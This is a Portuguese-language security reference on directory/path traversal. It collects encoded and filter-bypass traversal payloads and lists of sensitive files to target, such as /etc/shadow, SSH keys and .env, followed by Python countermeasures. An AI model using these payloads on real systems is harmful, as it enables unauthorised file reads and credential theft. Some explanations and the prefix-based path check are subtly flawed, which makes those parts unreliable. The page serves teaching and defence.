# Directory Traversal / Path Traversal

## 📊 Metadados

| Propriedade | Valor |
|---|---|
| **CVSS Score** | 7.5 (Alto) |
| **OWASP Top 10** | #1 - Broken Access Control |
| **CWE** | CWE-22 |
| **Status** | ⚠️ Ativo e crítico |
| **Impacto** | Acesso a arquivos sensíveis, LFI |

---

## 🔍 O que é Directory Traversal?

Directory Traversal (também chamado Path Traversal ou Local File Inclusion) permite que um atacante acesse arquivos e diretórios fora do diretório pretendido.

**Impactos:**
- Leitura de arquivos sensíveis (`/etc/passwd`, `/etc/shadow`)
- Acesso a código-fonte da aplicação
- Exposição de credenciais (`.env`, `config.php`)
- Information Disclosure
- RCE (em alguns casos com log poisoning)

---

## 💥 Exemplos Práticos de Exploração

### 1. **Sequências de Traversal Básica**

```
# Payload simples
../../../etc/passwd

# Com encoding
..%2F..%2F..%2Fetc%2Fpasswd

# Com barra dupla
..\\..\\..\\windows\\win.ini  (Windows)

# Sem barra inicial
etc/passwd  (relativo ao diretório atual)
```

### 2. **Bypass de Validação Simples**

```
# Validação: remove "../"
# Payload bypass: ....//....//....//etc/passwd
# Resultado: ../../../etc/passwd (após remove "../../")

# Validação: remove ".."
# Payload: ....//....//etc/passwd
# Resultado: ..//..//etc/passwd (após remove ..)

# Case variation
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd  (double encoding)
```

### 3. **Acesso a Arquivos Sensíveis**

**Linux/Unix:**
```
/etc/passwd
/etc/shadow
/etc/hosts
/root/.ssh/id_rsa
/home/user/.bash_history
/var/www/html/config.php
/proc/self/environ
```

**Windows:**
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\autoexec.bat
C:\apache\conf\httpd.conf
```

**Aplicações:**
```
/var/www/html/.env
/application/config.php
/app/database.yml
/wordpress/wp-config.php
```

### 4. **Null Byte Injection (até PHP 5.3)**

```
# Payload
../../../etc/passwd%00.jpg

# Resultado
../../../etc/passwd (truncado em %00)
→ Arquivo é lido, não .jpg
```

### 5. **URL Encoding**

```
# Simples
../../../etc/passwd

# Double encoding
..%252F..%252F..%252Fetc%252Fpasswd

# Triple encoding
..%25252F..%25252F..%25252Fetc%25252Fpasswd
```

### 6. **Ponto Duplo / Encoding Unicode**

```
..\\  (backslash em Windows)
..%2e%2e%2f  (ponto e slash codificados)
\u002e\u002e\u002f  (Unicode)
```

---

## 🛡️ Contramedidas e Prevenção

### 1. **Whitelist de Arquivos**

```python
ALLOWED_FILES = {
    'file1.txt': '/var/www/files/file1.txt',
    'file2.pdf': '/var/www/files/file2.pdf'
}

@app.route('/download/<file_id>')
def download(file_id):
    if file_id not in ALLOWED_FILES:
        return "Acesso negado", 403
    return send_file(ALLOWED_FILES[file_id])
```

### 2. **Validar e Sanitizar Entrada**

```python
import os
import re

def safe_path_join(base_dir, user_input):
    # Remover caracteres perigosos
    user_input = re.sub(r'[^\w\-\./]', '', user_input)
    
    # Construir path seguro
    full_path = os.path.abspath(os.path.join(base_dir, user_input))
    
    # Verificar se está dentro de base_dir
    if not full_path.startswith(os.path.abspath(base_dir)):
        raise ValueError("Path traversal detectado")
    
    return full_path
```

### 3. **Usar Índices em vez de Nomes**

```python
FILES = ['document.pdf', 'report.xlsx', 'image.jpg']

@app.route('/download/<int:file_id>')
def download(file_id):
    if 0 <= file_id < len(FILES):
        return send_file(f'/var/www/files/{FILES[file_id]}')
    return "Arquivo não encontrado", 404
```

### 4. **Desabilitar Funcionalidades Perigosas**

```python
# ❌ Vulnerável
file_path = request.args.get('file')
with open(file_path, 'r') as f:
    return f.read()

# ✅ Seguro
file_id = int(request.args.get('file_id'))
file_path = get_safe_file_path(file_id)
with open(file_path, 'r') as f:
    return f.read()
```

### 5. **Usar Bibliotecas de Segurança**

```python
from pathlib import Path
import os

base_dir = Path('/var/www/files')
requested_file = Path(request.args.get('file'))

# Verificar se está dentro de base_dir
full_path = (base_dir / requested_file).resolve()
if not str(full_path).startswith(str(base_dir.resolve())):
    return "Acesso negado", 403
```

---

## 📚 Referências

| Fonte | Link |
|---|---|
| PortSwigger Academy | https://portswigger.net/web-security/file-path-traversal |
| OWASP Path Traversal | https://owasp.org/www-community/attacks/Path_Traversal |
| HackTricks Path Traversal | https://book.hacktricks.xyz/pentesting-web/path-traversal |
| CWE-22 | https://cwe.mitre.org/data/definitions/22.html |

---

**Última atualização:** Agosto 2026
